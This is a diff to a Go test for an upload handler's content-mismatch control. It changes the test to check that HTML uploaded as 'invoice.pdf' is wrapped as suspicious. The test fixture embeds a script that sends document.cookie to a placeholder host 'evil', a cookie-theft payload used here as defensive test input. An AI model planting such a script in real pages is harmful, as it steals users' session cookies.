@@ -89,7 +89,18 @@ func TestUpload_OrdinaryFilesAreNotTreatedAsSuspicious(t *testing.T) {
 
 // And the deception the control exists for still fires. Without this, widening
 // the text rule could be "fixed" all the way to flagging nothing.
-func TestUpload_TextThatIsNotInertIsStillFlagged(t *testing.T) {
+//
+// This test used to assert that HTML wearing a .txt was wrapped, on the
+// argument that HTML is the one textual type that runs when it is opened. That
+// argument does not survive contact with how a file gets opened: the name
+// chooses the program, so notes.txt opens in an editor whatever is inside it.
+// The exclusion protected nothing and refused ordinary files — a captured HTTP
+// response saved as a .log among them, which is this design's own example of
+// an ordinary attachment. What a text name does is pinned in
+// handler_attachments_textnames_test.go; what is left here is the deception
+// under a name that claims a binary format, which is where the control has
+// something to do.
+func TestUpload_AContradictionUnderABinaryNameIsStillFlagged(t *testing.T) {
 	h, cleanup := newHarness(t)
 	defer cleanup()
 
@@ -106,9 +117,10 @@ func TestUpload_TextThatIsNotInertIsStillFlagged(t *testing.T) {
 	require.NoError(t, h.adminSvc.SetString(context.Background(),
 		admin.KeyAttachmentMismatchHandling, admin.MismatchHandlingWrap))
 
-	// HTML is the one textual type that runs when it is opened, because a
-	// browser is what opens it.
-	res := uploadNamed(t, h, tk.ID.String(), "notes.txt",
+	// HTML arriving as a PDF. The name claims a binary format, and .html is
+	// not a type this instance accepts, so this is the one condition the
+	// setting governs.
+	res := uploadNamed(t, h, tk.ID.String(), "invoice.pdf",
 		[]byte(`<html><body><script>fetch('//evil/'+document.cookie)</script></body></html>`))
 	res.Body.Close()
 	require.Equal(t, http.StatusCreated, res.StatusCode)
@@ -116,7 +128,7 @@ func TestUpload_TextThatIsNotInertIsStillFlagged(t *testing.T) {
 	list := attachmentsOverHTTP(t, h, tk.ID.String())
 	require.Len(t, list, 1)
 	require.True(t, strings.HasPrefix(list[0].Filename, "suspicious-"),
-		"HTML wearing a .txt is still wrapped: %q", list[0].Filename)
+		"HTML wearing a .pdf is wrapped: %q", list[0].Filename)
 	require.NotNil(t, list[0].ContentMismatch)
 	require.True(t, *list[0].ContentMismatch)
 
